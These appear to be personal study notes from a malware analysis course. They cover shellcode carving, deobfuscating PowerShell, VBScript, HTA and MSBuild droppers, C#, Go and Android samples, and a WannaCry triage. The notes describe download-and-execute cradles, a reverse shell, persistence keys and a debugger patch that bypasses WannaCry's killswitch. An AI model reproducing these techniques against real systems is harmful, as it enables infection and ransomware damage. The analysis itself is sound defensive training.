`scdbg` -->   is a shellcode analysis application 
- it will interpret the bytes of the shellcode
- step through the program to -->  resolve API calls
- see what the shellcode is doing
  =>
  _<span style="color:#00b050">it will not run the shellcode</span>_

when you run it:
you need to specify the <span style="color:#00b050">n° of steps</span> (`s`):
n° of instructions that shellcode debug will walk through -->     to identify what the shellcode is 
                                                     doing (at each set of instructions)
if you write `-1` -->   n° of steps are unlimited
=>
`scdbg /f out.bin -s -1`
![[Pasted image 20240317162910.png]]
=>
the shellcode:
- connects to -->  `burn.ec2-13-7-109-121-ubuntu-2004.local`
- download a file
- save it locally by creating a -->  `javaupdate.exe` file
- execute `javaupdate.exe` 
  
### Carving Shellcode from Memory
LAB:
`PMAT-labs\labs\3-2.WhatTheShell-ShellcodeAnalysis\CarveFromMemory`

Normally a shellcode is -->  inside a binary
=>
here we are going to:
<span style="color:#00b050">extract the shellcode from the memory of a running process</span> 
=>
- we'll use a debugger 
- find when the shellcode is been injected
- extract the shellcode before the injection

#### PeStudio
classic import for -->  thread injection
![[Pasted image 20240317163906.png]]

Where we are going to intervene:
is during `WriteProcessMemory` API call

Now:
we need to find where this injection takes place

### Cutter
<span style="color:#ff9900">no debug symbols</span> for this malware -->  it will be harder find the main
#### Find main function with no Debug Symbols
we need to:
- start at the -->  <span style="color:#00b050">end of the program</span>
- work backwards
- <span style="color:#00b050">find the last place</span> where a function -->  <span style="color:#00b050">return</span> something into the `EAX` register 

<span style="background:#fff88f">why:</span>
when a binary is executed:
- the first thing that happen is -->  the <span style="color:#00b050">entrypoint</span>
- entrypoint -->    - is not the main function
                 - is the <span style="color:#00b050">CRT</span>  (C RunTime)
	                 - the last thing that happen in the CRT -->  is the call to <span style="color:#00b050">main</span>

<span style="background:#fff88f">if we want to find the main function:</span>
we need to look at --> <span style="color:#00b050"> last possible</span> time that something is <span style="color:#00b050">called</span> <span style="color:#00b050">inside the CRT</span>

=>
- Open Cutter 
- it will display the entry point
- click on the last call inside the CRT
- open the graph view![[Pasted image 20240318103054.png]]
- resize it
- go to the bottom of the graph![[Pasted image 20240318103135.png]]

<span style="background:#fff88f">NOW:</span>
>[!warning]
>WHAT EVER THE MAIN FUNCTION RETURNS:   (integer value, boolean, void)
><span style="color:#00b050">it will always return something into</span> -->  `EAX`

=>
- in the last function we have -->  `mov  eax,  dword [...]`![[Pasted image 20240318103538.png]]
	=>
- click on the address and look where this value is assigned
![[Pasted image 20240318103741.png]]

- <span style="background:#fff88f">we can assume that:</span>
	- since in this function in the last CALL:
		- move `EAX` into the `dword[...]`
	- and in the last function: (first img)
		- `EAX` is returned to the OS
=>
<span style="color:#00b050">Probably the last img</span> -->  is the <span style="color:#00b050">main function</span>
=>
- double click on this function (double click on the last call in this function)
- right click > Edit function > <span style="color:#00b050">rename it as main</span> 

=>
#### Main
- we have 3 call inside main![[Pasted image 20240318104939.png]]
- open the last one
- here we can see the API call that the malware uses:![[Pasted image 20240318105202.png]]
here:
- we don't need to do other analysis 
- <span style="color:#00b050">we want to extract the shellcode before it's injected in the host</span>
- =>
- we only need the address of the -->  API call `WriteProcessMemory`
  =>
  copy the address next to this API call (`0x0040170a`)

Now we can use -->  x64dbg

###  x64dbg
- open the malware
- `CTRL+G` inside the main CPU tab -->  paste the address
- set a breakpoint to this address (`F2`)
- execute the program until we reach that breakpoint (`F9`)![[Pasted image 20240318110013.png]]


let's look inside the WriteProcessMemory documentation:
- it takes 5 parameters![[Pasted image 20240318110125.png]]

- the third one is the parameter that we need:![[Pasted image 20240318110202.png]]
  
- `lpBuffer` -->  is simply words is the buffer that contains the shellcode when the process is 
              created 

=>
- set the breakpoint to the actual `call`  (next line)
- delete the old breakpoint
- press `F9` to move to the call
- <span style="color:#00b050">find the third parameter</span> =>   count 3 lines before the API `call`![[Pasted image 20240318110754.png]]
  
- right click on it > Follow in dump > `r8: ...`     (to see what is inside `r8`)
- <span style="color:#00b050">we have found the shellcode</span> 

#### Find the shellcode size
In this example, the size of the buffer that the program is injecting is known.
`VirtualAllocEx` call -->   - is executed before the `WriteProcessMemoryEx` call
                       - sets up the section of memory 
                       - changes the RWX permissions so the shellcode is executable.

According to the documentation -->   VirtualAllocEx takes in 4 parameters. 
The third parameter -->  is the `dwSize` parameter, 
                     _<span style="color:#00b050">which is the size of the buffer in bytes</span>_
=>
If we locate the `VirtualAllocEx` call:     (which is right before WriteProcessMemory)
- set a breakpoint on the 3°  parameter that is moved into the registers before it is called
	- we see that it moves a value from `RDX` into `R8` -->  to set up for that call
	- If we look at RDX when the move takes place -->   it's the hex value `0x01D1`, 
		- which corresponds to the decimal value -->  465
		  =>
		  _<span style="color:#00b050">the  shellcode is 465 bytes</span>_
		  
		  
Then, do some memory address hex math and you know where to start and where to end

=>
#### Save shellcode into file
- highlight the entire shellcode![[Pasted image 20240318112206.png]]
  
- right click on it > Binary > Save to file > `dump.bin`

#### Analyze shellcode - scdgb
[[cheat#scdbg]]
`scdbg /f dump.bin -s -1`
![[Pasted image 20240318112548.png]]

##  Scripted Malware Delivery Mechanisms
### PowerShell: Analyzing Obfuscated Scripts
LAB:
`PMAT-labs/labs/3-3.OffScript-ScriptMalware/PowerShell/Malware.PSObfusc.ps1.malz.7z`

- delete the extra extension
- open it in notepad
![[Pasted image 20240318114353.png]]

Powershell:
is a very <span style="color:#00b050">malleable script language</span>   (malleabile)
=>
it's easy for malware developer -->  to <span style="color:#00b050">obfuscate</span> code or strings

example:
- it's not case sensitive
- you can concat strings like this -->  `iEx` can become `i+"E"+x`

if you look at the script:
we have `iEx(...)

<span style="background:#fff88f">what is iEx:</span>
stands for Invoke-Expression -->  <span style="color:#00b050">runs a specified string as a command </span> 

<span style="background:#fff88f">what the malware is doing:</span>
- run a string as a command
- the string is built from:
	- create a new object
	- covert text from base64 into string
	- the base64 text is also -->  compressed 

- when you have decompressed and converted into a string =>  pass it inside the last line of the
                                                      script

=>
- make a copy of the malware
- open cmder and open a powershell 

<span style="background:#fff88f">what we can do:</span>
is to -->  <span style="color:#00b050">delete the</span> `iex(` <span style="color:#00b050">expression</span>   (and also the last `)`)
in this way:
- we can <span style="color:#00b050">assign all the rest of the code</span> -->  to a <span style="color:#00b050">variable</span>
- <span style="color:#00b050">read the content</span> of the variable

<span style="background:#fff88f">why:</span>
<span style="color:#00b050">bc we don't need to</span> -->  <span style="color:#00b050">decode</span> and <span style="color:#00b050">decompress</span> the <span style="color:#00b050">string</span> in the script to understand what it is
why?
bc -->  <span style="color:#00b050">the script already does it for us</span>
=>
by deleting the `iex(` expression -->  we are <span style="color:#ff9900">DISARMING</span> the script  (bc is iEx that runs the string)

<span style="background:#fff88f">the right term is:</span>
<span style="color:#ff9900">DEFANGED</span> -->   process that modifies malware, making them non-functional and safe to share

#### Defanged a malware
=>
- delete the `iex(`expression  (and also the last `)`)
- inside the powershell -->  `$variable = nEW-ObJECt ...` ![[Pasted image 20240318120611.png]]

- `write-host $variable`  -->  to print the value of the powershell script![[Pasted image 20240318121017.png]]

=>
- it's a reverse TCP shell
- that binds to `10.10.115.13` at `1433` port

###  VBScript: Analyzing a Multi-Stage MSBuild Dropper
LAB:
`PMAT-labs/labs/3-3.OffScript-ScriptMalware/VBScript/Dropper.VBScript.vbs.malz.7z`

we have 3 files:
![[Pasted image 20240318121407.png]]
=>
open the Visual Basic script with an editor
![[Pasted image 20240318121437.png]]

<span style="background:#fff88f">VB is used for malware scripting:</span>
bc it allows to <span style="color:#00b050">use</span> -->  <span style="color:#00b050">deep primitive </span> (to interact with the system)

=>
<span style="background:#fff88f">what the code does:</span>
- it creates a shell object
- 2 calls to certutil:
	- 1 to decode -->  `one.crt` and sending it back to `C:\Users\Public\Documents\one.vbs`
	- 1 to decode -->  `two.crt` and sending it back to `C:\Users\Public\Documents\xml.xml`

- it executes the `one.vbs` file

<span style="background:#fff88f">If we execute the script and we go to the location of the file:</span>
![[Pasted image 20240318122209.png]]

We can see that -->  the 2 files are been created

=>
- open both with an editor
- `one.vbs`:![[Pasted image 20240318122319.png]]

	- we have 2 strings (`a` and `aa`)
	- both of them -->  - being modified using the `update()` function
	                   - assigned to `aaa` and `aaaa`

	- we create an object 
	- we use that object to <span style="color:#00b050">shell execute</span> -->   - the content of `aaa`, `aaaa`
	                                     - passing as parameter `runas`
	- the `update` function:
		- replace "vVv" with nothing
		  =>
		  it's a <span style="color:#ff9900">deobfuscation method</span> =>  it tries to build a string 
		=>
	- <span style="background:#fff88f"> if we execute only the update function:</span>
	  we can find the the 2 real strings are:
	  ![[Pasted image 20240318123112.png]]

	- on VSCode to do that: (find the real strings)
		- you can press `CTRL+F` ![[Pasted image 20240318123252.png]]
	=>	
	- we are passing these 2 strings to the object that executes the shell
	  
	- last thing we need to understand is what is this string:![[Pasted image 20240318123506.png]]
	  =>
	- search it on google
	- it's a class that spawn a -->  <span style="color:#00b050">shell browser window</span> 
	  =>
	- we create an object as this class shell browser window
	- we pass in -->  the shell execute method

<span style="background:#fff88f">Let's see the ShellExecute documentation:</span>
- it takes 5 parameters
1) is the path to the file that will be executed 
   =>  `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe`

2) arguments for the program executed  (=> argument for `MSBuild.exe`)
   => `C:\Users\Public\Documents\xml.xml`

3) is a directory (optional) -->  indeed we have `NULL`
4) operation to be performed =>   `runas`     (probably run as admin)
5) vShow and `0` means -->  open app with an hidden window

<span style="background:#fff88f">what MSBuild does:</span>
if we google it -->  utility for building an app with visual basic
=>
you need to pass to it -->  a <span style="color:#00b050">XML file</span>

<span style="background:#fff88f">that XML file:</span>
<span style="color:#00b050">contains</span> -->  the<span style="color:#00b050"> info that you want to build</span> 

<span style="background:#fff88f">if we open our XML file:</span>
![[Pasted image 20240318125022.png]]
=>
we are passing -->  a<span style="color:#00b050"> C# code</span> 
that executes this shellcode:
![[Pasted image 20240318125151.png]]

=>
we can analyze the shellcode or:
<span style="background:#fff88f">try to run the MSBuild utility with the XML file:</span>
=>
- open cmder
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\Documents\xml.xml`
  ![[Pasted image 20240318125354.png]]
  =>
- retry as admin![[Pasted image 20240318125446.png]]

<span style="background:#fff88f">what the C# does:</span>
- invoke the shellcode
	- adds a user to the remote desktop group
	- adds that user to the administrator group
	- open a port into the firewall to open RTP

=>
- restore the VM pre detonation
- open cmder and look at the user -->  `net user`![[Pasted image 20240318125753.png]]

- open new cmder as admin
- invoke the crtupdate.vbs -->  `crtupdate.vbs`
- retype `net user`![[Pasted image 20240318130644.png]]
  =>
  _<span style="color:#00b050">we have a new user</span>_

- that<span style="color:#00b050"> user is also added to the administrator group</span> -->  `net localgroup Administrators`![[Pasted image 20240318130814.png]]

- the user is added as remote user -->  `net localgroup "Remote Desktop Users"`

###  HTML Applications (HTA)
LAB:
`PMAT-labs/labs/3-3.OffScript-ScriptMalware/HTA/Dropper.hta.7z`

<span style="color:#00b050">HTAs</span> -->  are commonly used as the<span style="color:#00b050"> payload of phishing attacks</span> 
<span style="background:#fff88f">HTAs are:</span>
- Windows-executable,
- packaged HTML files that run:
	- HTML
	- CSS
	- <span style="color:#00b050">Windows native scripting languages</span> --> - from a single file 
	                                    - <span style="color:#00b050">outside of the context</span> of the web browser. 
<span style="background:#fff88f">This is scary bc:</span>
- HTAs do not run in the context of the Windows web browser, 
- <span style="color:#00b050">HTAs run  as a trusted application on the OS</span>

An HTML app -->  is not much different from a normal HTML page   (in terms of construction)

### Example
A simple HTA in which -->  if you click a button => it will spawn an alert
![[Pasted image 20240318151246.png]]
This alert is --> <span style="color:#ff0000"> a windows alert </span>(is not inside the browser)
### Analyzing HTAs
Remove the extra extension to the file
#### Static Analysis
open the script with an editor
![[Pasted image 20240318151544.png]]
=>
- `document.write()` -->  method that writes directly to an open HTML document stream
- `unescape()` -->     function that <span style="color:#00b050">computes a new string </span>
                 in which:
                    - <span style="color:#00b050">hexadecimal escape sequences</span> 
                    - are <span style="color:#00b050">replaced</span> with -->  the <span style="color:#00b050">characters that they represent</span> 
=>
the interpreted characters -->  are written to the document of the page

##### Decode Hex
- Open [[cheat#CyberChef]]
- Copy the data
- Select `From Hex` decoder and change the delimiter to `Percent`
=>
this is the output:
![[Pasted image 20240318152357.png]]

This is a Visual Basic script:
What it does:
- set up the required parameters -->  to invoke <span style="color:#00b050">Windows Management Instrumentation (WMI)</span> 
                                 to execute a process
`WMI`:
- is a part of the Windows OS -->  that acts as an interface for management purposes 
- can start and run processes through the `Win32_Process` namespace.
  =>
  this means that -->  <span style="color:#00b050">anything that can access WMI can execute a process</span>

In our sample, the VBScript code is setting `WMI` up to be able to execute a process:
![[Pasted image 20240318152742.png]]

Then the VB script:
![[Pasted image 20240318152813.png]]
-  executes a process through the `WMI` service
- returns the results to the `Error` variable

![[Pasted image 20240318152859.png]]
- The process argument here runs a command shell 
- this shell runs PowerShell in a hidden window
- When PowerShell is executed, it performs the commands in the img

The VBScript then calls `window.close()` to close out of the HTA window

=>
The script:
- HTA is opened and runs the embedded JavaScript
- The JS decodes the hex bytes of an inner HTML document and writes it into the HTA
- The inner HTML document invokes VBScript to execute WMI
- WMI runs a process to call a command shell
- The command shell, in turn, runs PowerShell in a hidden window
- PowerShell runs a download cradle command to reach out to http://tailofawhale.local/TellAndSentFor.exe 
	- write it to the `%temp%` directory as `jLoader.exe` 
	- then execute `jLoader.exe`

#### Dynamic Analysis
When we open the malware:
- without INetSim -->  nothing
- with INetSim -->  we see the default INetSim binary spawn
                 =>
                 _<span style="color:#00b050">copy location where the binary is running from</span> _
                 ![[Pasted image 20240318153401.png]]

`Dropper.hta` has clearly succeeded in -->   <span style="color:#00b050">downloading and executing something</span>

Let’s examine the network signatures

##### Wireshark
We found a DNS request to -->  t`ailofawhale.local`    (and then the HTTP request)
![[Pasted image 20240318153549.png]]

##### Host indicators
There is no process called `Dropper.hta` anywhere in the list of running processes on the host
=>
- HTAs do not execute directly
  =>
- when double-clicked on the malware:
	- it is passed to the native Windows binary `mshta.exe` 
	- `mshta.exe`:
		- executes it on its behalf
		- acts as an HTML interpreter
		- loads the HTML from the HTA along with any DLLs that deal with script execution
		- executes the program all at once

If we look in the Procmon process tree after detonation:
we see an invocation of `mshta.exe` -->  that takes the path to our HTA sample

<span style="background:#fff88f">Where is the call to PowerShell and the command shell?</span>
In the process list, -->    - there is an instance of `svchost.exe` 
                    - that is executing a process called `wmiprvse.exe`
                      =>
                      this is the way that <span style="color:#00b050">Windows invokes WMI</span> -->  to execute processes
            

We can follow the `wmiprvse.exe` process:
-  all the way down through the call to PowerShell 
- and, eventually, the execution of the `jLoader.exe` program

In this case,:
- this was our INetSim default binary that spawned the message box,
- but in real life this is likely a second stage payload.

## Reversing C# Malware
LAB:
`PMAT-labs/labs/3-4.StaySharp-CSharpMalware/Malware.cryptlib64.dll.malz/Malware.cryptlib64.dll.malz.7z`

<span style="background:#fff88f">C# is different from other languages:</span>
bc:
you are not necessarily interacting with the OS -->  in the same that you interact with a x86 binary

C# lives into --> <span style="color:#00b050"> .NET framework</span> 
=>
every binary created in .NET:
use the -->       <span style="color:#00b050">Common Language Runtime</span> (CLR)
             for the **execution** of the program

<span style="background:#fff88f">How a C# binary is created:</span>
- program is written in C#
- program is passed to -->  <span style="color:#00b050">C# compiler</span>
- C# compiler -->  translates the high code into <span style="color:#00b050">Intermediate Language</span> (IL)
- the IL -->   - serves as an<span style="color:#00b050"> intermediate representation of the code </span>
            - that can be executed by the Common Language Runtime 
              
- finally the <span style="color:#00b050">CLR</span> -->  performs the execution on the OS  (<span style="color:#00b050">by translating the IL into assembly</span>)

Why Intermediate Language is useful in this subject?
bc it's <span style="color:#00b050">easy</span> -->  to <span style="color:#00b050">reverse engineering</span> it

### Reverse C# binary into IL
- open dnSpy tool as admin on FlareVM
- open the malware 
- it found 2 classes
	- open Program folder and `Program` Class![[Pasted image 20240318165402.png]]
	  
	  ![[Pasted image 20240318165700.png]]
	  =>
	- we get the SHA256 digest byte of a string
	- we decrypt a block of base64 encoded text
	- we write all text -->  to a place inside OS
	- we get the environment variable -->  for the "public" directory
	- we write this into a file -->  `embed.xml`
	- we decode another base64 text and save it inside:  `C:\\Users\\Public\\Documents\\embed.vbs`
	  
	- we create a registry key called `embed`
		- that runs `C:\\Users\\Public\\Documents\\embed.vbs`

Let's try to run the script:
- open cmder
- remove the extra extension to the malware
- to run it -->  <span style="color:#00b050">we need to pass the name of the main function</span>
  =>
  we knew it -->  it's `embed`
  =>
  run: 
  `rundll32.exe Malware.cryptlib64.dll, embed`

- now we should find the 2 files created in the host fs:![[Pasted image 20240318171025.png]]
  
- also we show see the registry key created
	- search Registry Editor 
	- search `Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`![[Pasted image 20240318171438.png]]
	
=>
We found the host indicators

=>
now let's finish the analysis by analyzing -->  the 2 created files

#### embed.vbs
![[Pasted image 20240318171804.png]]
- create a Shell object
- that runs MSBuild with parameter -->  `embed.xml`
- Run the shell

#### embed.xml
Decode a base64 code and decompress it
what is interesting is this -->  `System.Reflection.Assembly.Load()`
![[Pasted image 20240318172109.png]]

what it does:
- whatever this block of base64 is doing
- it is then:
	- being loaded reflectively -->  as a <span style="color:#00b050">reflective assembly</span>

=>
this a <span style="color:#00b050">common thing</span> used to:
-  <span style="color:#00b050">avoid antivirus</span>
- be able to <span style="color:#ff9900">load in a program </span>
- <span style="color:#ff9900">write into memory byte per byte</span>

## Analyzing Go Malware
LAB:
`PMAT-labs/labs/3-5.GoTime-GoMalware/Backdoor.srvupdat.exe.malz.7z`

In the last years Go is commonly used for malware development:
bc -->  with a <span style="color:#00b050">single code you can use the program on different OSs
</span>

we'll only see how to understand -->  if a malware is written in Go
### Understand if a malware is written in Go
<span style="background:#fff88f">How to identify if a malware is written in Go:</span>
- the binaries are heavy (in term of megabytes)
- strings contain:
	- `.symtab` -->  symbol table section name
		- can find it with floss or:
		- with [[cheat#PEview|Pe-Bear]]:    (better tool than PEView for 64bit malware analysis)![[Pasted image 20240319101015.png]]
	  
- try [[cheat#FLOSS]] with -->  `floss malware.bin -n 7 | grep -i go`
	- if you see hundred of lines as output =>  it's Go :)

- for the default import of the HTTP library:
	- the <span style="color:#00b050">default user agent</span> -->    <span style="color:#00b050">tells you everything you need to know </span>
	                         about the language that this malware is being written
	                         
	- this can be changed -->  but if left as default => you'll find these info
	- ALSO true for nim language
	  
	 example:![[Pasted image 20240319100346.png]]
	  
### Compiled binary Pattern Recognition for other languages
You can use the same approach -->  for other languages
Example:
- nim
- C#

## Mobile Malware Analysis
### Installing MobSF
we need to install this tool on REMnux =>  we need to switch back to real internet
=>
- Click on VM top bar "Machine" > Settings > Network > <span style="color:#00b050">switch from Host only Adapter to NAT</span>
- `sudo reboot`
- [guide reference](https://mobsf.github.io/docs/#/docker)
- `docker pull opensecurity/mobile-security-framework-mobsf` 
- `docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest`
- open the link![[Pasted image 20240319102338.png]]
- if you find this =>  everything worked![[Pasted image 20240319102411.png]]
  
- Click on VM top bar "Machine" > Settings > Network > <span style="color:#00b050">switch from NAT to Host only Adapter </span>
- `CTRL+C`
- `sudo reboot`
- `docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest`

### Intro to MobSF
we can only do -->  static analysis  (since we are inside docker)

we need to copy the malware from FlareVm to REMnux:
=>
- extract the malware inside the Desktop > cd into Desktop and the folder of the malware
- `python -m http.server 8080`
- on REMnux -->  `wget http://10.0.0.3:8080/Malware.android.apk.malz`
- `mv Malware.android.apk.malz Malware.android.apk`
- Upload the malware into MobSF

#### Basic info
in the main page:
![[Pasted image 20240319103915.png]]

#### Source Code
<span style="background:#fff88f">You can see the source code: </span>  (if the program is written in Java)
![[Pasted image 20240319104116.png]]

![[Pasted image 20240319104146.png]]

#### Permission Section
If you scroll down to the main page:
you can see the -->  <span style="color:#00b050">Permission section</span>
                  that describes <span style="color:#00b050">what the malware can do</span> on a smartphone
![[Pasted image 20240319104520.png]]

#### Android API
What are the APIs used by the malware and WHERE they are
![[Pasted image 20240319104828.png]]

# Analyzing Real-World Malware Samples - Wannacry
## Info
README:
![[Pasted image 20240319110701.png]]
<span style="background:#fff88f">Questions:</span>
- Record any observed symptoms of infection from initial detonation. 
  What are the main symptoms of a WannaCry infection?
- Use FLOSS and extract the strings from the main WannaCry binary. 
  Are there any strings of interest?
- Inspect the import address table for the main WannaCry binary. 
  Are there any notable API imports?
- What conditions are necessary to get this sample to detonate?
- **Network Indicators**: Identify the network indicators of this malware
- **Host-based Indicators**: Identify the host-based indicators of this malware.
- Use Cutter to locate the killswitch mechanism in the decompiled code and explain how it functions.

## First Detonation
### Symptoms of infection from initial detonation
What are the main symptoms of a WannaCry infection?

If you run it:
- without INetSim -->  nothing happen
- <span style="color:#00b050">without INetSim + admin priviliges</span> -->  malware works
	- desktop change
	- all files are encrypted
		- appended with a `.WNCRY` extension
	- readme file on desktop![[Pasted image 20240319112028.png]]
	-  appearance of a `@WanaDecryptor@` executable
	  
- withINetSim -->  nothing happen
- with INetSim + admin priviliges -->  nothing happen

## Static Analysis 
### Basic info PEStudio
![[Pasted image 20240319112845.png]]
### FLOSS
There is an URL:
![[Pasted image 20240319113223.png]]
`http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`

And some IPs:
![[Pasted image 20240319113841.png]]
![[Pasted image 20240319113822.png]]

<span style="background:#fff88f">Is a portable executable:</span>
![[Pasted image 20240319122429.png]]

This string appears -->  multiple time
=>
probably there are -->  <span style="color:#00b050">mutiple packed executables inside the initial .exe</span>

<span style="background:#fff88f">2 paths with token replacement:</span>
![[Pasted image 20240319122733.png]]

<span style="background:#fff88f">Also an .exe</span>

<span style="background:#fff88f">Grant access to everyone in the current directory:</span>
![[Pasted image 20240319122937.png]]

<span style="background:#fff88f">Hide files in the local diretory:</span>
![[Pasted image 20240319123049.png]]
### PEStudio
finds 3 other exe file inside the main one:
![[Pasted image 20240319123140.png]]
#### Import address table
There are:
- Internet use
- use of Cryptographic API
- API for service creation =>   this is a correlation to the 3 other .exe found
![[Pasted image 20240319113548.png]]

### Conditions necessary to get this sample to detonate
The binary attempts to initiate a connection with the weird URL
`http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`


If a connection is:
- not established =>   the rest of the ransomware payload is executed
- is established =>  the program exits without executing the rest of the ransomware payload
=>
<span style="color:#00b050">INetSim must be turned off</span> in order to detonate the sample

<span style="background:#fff88f">this can be found with wireshark:</span>
if run INetSim, open wireshark and run the malware:
![[Pasted image 20240319123730.png]]

you'll see:
- the request to the URL
- the response
- and the malware stops its execution

## Dynamic Analysis
### Identify the network indicators of this malware
#### TCPView
connection to a bunch of SMB
SMB port = 445
=>
<span style="color:#00b050">we found how the malware propagates itself</span>
=>
it uses SMB connection to connect to other clients and detonate the malware
![[Pasted image 20240319114739.png]]

#### Wireshark
First DNS request to resolve:
`www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`: type A, class IN
![[Pasted image 20240319115320.png]]

### Identify the host indicators of this malware
#### Procmon
Sub-process:
![[Pasted image 20240319120348.png]]

[[Notes_PMAT#Filter By Parent PID]]
Sub-process creates a folder:
![[Pasted image 20240319121012.png]]

The Folder is -->  `C:\ProgramData\wwoxareq596`
contains:
![[Pasted image 20240319121125.png]]

#### Services
If we open task manager > go to Services:
We can find a service called as our folder
![[Pasted image 20240319124917.png]]

### Advance Analysis
#### Cutter
- open the `main` function and open the `graph view` mode
![[Pasted image 20240319171338.png]]
=>
- the weird URL is loaded in -->  `esi`
- there are 2 API calls:
	- `InternetOpenA` -->  setup thing to open a handle to a given web resource
	- `InternetOpenUrlA` -->   takes as one of the parameter `esi`  (=> the URL)
- if we open the decompiler section:![[Pasted image 20240319172110.png]]
	- we can see that:
		- return value of InternetOpenUrlA -->  is loaded into `eax`
		- `eax` is copied into `edi`
		- the if represents -->  the other 2 graphs in the first img![[Pasted image 20240319172331.png]]
=>
- there is the -->  `test  edi, edi`
	- if `test` result is:
		- <span style="color:#00b050">0 =>  Zero Flag set to 1</span>      (right graph)
		  =>
		  clean the argument on the stack
		  _<font color="#2DC26B">call a function</font>_
		  if you open it =>   <span style="background:#fff88f">it's the function that ENCRYPT the data</span>
		  =>
		  _<span style="background:#fff88f">we found the part the manage the encryption</span>_
		  
		- <span style="color:#ff0000">1 =>  Zero Flag set to 0</span>      (left graph)
		  =>
		  the API call succeded (=> it reached the URL and received a reply)
			  =>
			   clean the arguments on the stack and exit

=>
let's try to open it in debugger:
 and see if we can execute the malware -->  even if it received a reply from the URL

### x32dgb
- enable INetSim on REMnux
- on FlareVM clear the DNS cache -->  `ipconfig /flushdns`
- remove the extra extension to the binary
- open x32dbg as admin
  
=>
- load the binary
- press `F9` (start)
- right click in the main tab > Search For >  All modules > String references
- paste the weird URL `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea`
- set a breakpoint here (`F2`)
- return to the CPU tab
- press `F9` to reach the breakpoint
- we are in the same point as in cutter
- bc we can see the API call:![[Pasted image 20240319174846.png]]
  =>
- press `F8` -->  until the Zero Flag is evaluated (to see if we want to run the rest of the program)
  =>
  reach the `test  edi, edi` instruction:![[Pasted image 20240319175139.png]]
  
- Currently the `edi` value is -->  `00CC000C`   ![[Pasted image 20240319175304.png]]
  =>
  it's not 0 =>    the jump will end the program  
             _<span style="color:#00b050">bc the API call succeeded in being answered by the URL</span>_
  =>
- press `F8` -->  to see how the Zero Flag is setted![[Pasted image 20240319175355.png]]
  
  ZF = 0 =>  with the jump the program will finish  

=>
- <span style="color:#00b050">double click to ZF flag</span> -->  <span style="color:#00b050">to change its value</span> 
- in this way:
 _<span style="background:#fff88f"> even with INetSim enabled the malware will execute:</span>_
 =>
- press `F8` until you reach the API call to the method that encrypt everything![[Pasted image 20240319180205.png]]
- press `F8` to run API call

=>
<span style="color:#00b050">we execute the malware even with INetSim</span>![[Pasted image 20240319180825.png]]

To continue the Advance analysis watch -->  [this](https://www.youtube.com/watch?v=Sv8yu12y5zM&ab_channel=stacksmashing)

# Automation: Sandboxes & Pipelines
Automation is fundamental for Malware analysis
Most of all for -->  the first part 
## BlueJupyter: Automating Triage with Jupyter Notebooks
LAB:
`PMAT-labs/labs/5-1.Automation-BlueJupyter/FORTRIAGE.7z`

Jupyter -->  way to <span style="color:#00b050">package your documentation and code together</span>

### Installing Blue-Jupyter in Docker
- Enable internet on REMnux (switch to NAT in the network settings)
- `git clone --branch PMAT-lab https://github.com/HuskyHacks/blue-jupyter.git && cd blue-jupyter`
- `sudo docker build -t bluejupyter .`
- When the image is finished building:
  `sudo docker run -it -p 8888:8888 -v /home/remnux/blue-jupyter:/src bluejupyter`

- if you want to add malware do the dropbox
  =>
	- copy the malware from the PMAT-labs repository 
	- into the `/home/remnux/blue-jupyter/malware-analysis/dropbox/`
	  =>
	  in this way -->  it will also copy into the container

- open the URL into the container to check if it works
- TURN OFF INTERNET

### Copy the LAB malware into REMnux
- extract the folder of the malware into Desktop 
  `PMAT-labs/labs/5-1.Automation-BlueJupyter/FORTRIAGE.7z`
- `cd Desktop`
- `python -m http.server 80`
- on Remnux -->  `wget -r --no-parent http://10.0.0.3/FORTRIAGE`

In this folder:
we have like -->  20 malwares
=>
we'll analyze them with Blue Jupyter

### Using Blue-Jupyter
- `cd` into `blue-jupyter` folder
- `sudo docker run -it -p 8888:8888 -v /home/remnux/blue-jupyter:/src bluejupyter`
  click on the last URL to open the notebook:![[Pasted image 20240320102910.png]]
	
- go to the malware-analysis folder > Open the `Malware-Analysis.ipynb`  (that is the notebook)![[Pasted image 20240320103034.png]]

=>
Copy the malwares into the dropbox folder:
- `cd ~/blue-jupyter/malware-analysis/dropbox`
- `rm *`
- `cp -r ~/Desktop/10.0.0.3/FORTRIAGE/* .`

Go the browser:
<span style="color:#00b050">click run on each block of code</span> -->  to execute it
![[Pasted image 20240320105058.png]]

=>
Each python block of code -->  it will execute

in this way:
<span style="color:#00b050">it will automate a lot of initial analysis for us</span>

then:
![[Pasted image 20240320105333.png]]

1) it will create a folder for each malware (to save the result for each of them)
	   - inside the `/blue-jupyter/malware-analysis`:
	   - it will create a folder -->  `saved-specimens`
	   - inside that it will create a folder -->  for each malware
2) it will <span style="color:#00b050">defang</span> each malware =>  it will <span style="color:#00b050">a</span><span style="color:#00b050">dd an extra "malz" extension</span> to the malware
                             so that it's safe to do don't execute it
                             __
	   - it will add the extension to each malware inside its own folder
	     
=>
<span style="background:#fff88f">Continue pressing Run button:</span>
=>
- <span style="color:#00b050">Calculate HASH of the malwares</span>![[Pasted image 20240320105925.png]]
  
- <span style="color:#00b050">Extract Strings</span>
  using a tool called `StringSitter` -->   <span style="color:#ff9900">that uses AI to extract the strings</span>
  =>
  to run it we need to specify the n° of characters =>  insert 8
  ![[Pasted image 20240320110230.png]]
  ![[Pasted image 20240320110245.png]]
	
	=>
	for now in each Folder we have:
	- malware with extra extension
	- the hash
	- the extracted strings
	![[Pasted image 20240320110359.png]]
	
	=>
	open the String output:
	each string has a value -->  <span style="color:#00b050">higher value means the can be potentially a malicious string</span>![[Pasted image 20240320110602.png]]
	
	
- <span style="color:#00b050">Virus Total analysis</span>:
  to use it:
	  - you need to be connected to the internet
	  - must use a valid VirusTotal API key to get the API results
	  - VirusTotal Public API keys are free and you can sign up for one here: [https://www.virustotal.com/gui/join-us](https://www.virustotal.com/gui/join-us)![[Pasted image 20240320111020.png]]

- <span style="color:#00b050">Create A zip for each folder and protect it with a password</span>![[Pasted image 20240320111056.png]]

=>
<span style="background:#fff88f">The Jupyter notebook can be useful to:</span>
- create your own workflow -->  to automate the malware analysis
- also add documentation to the code

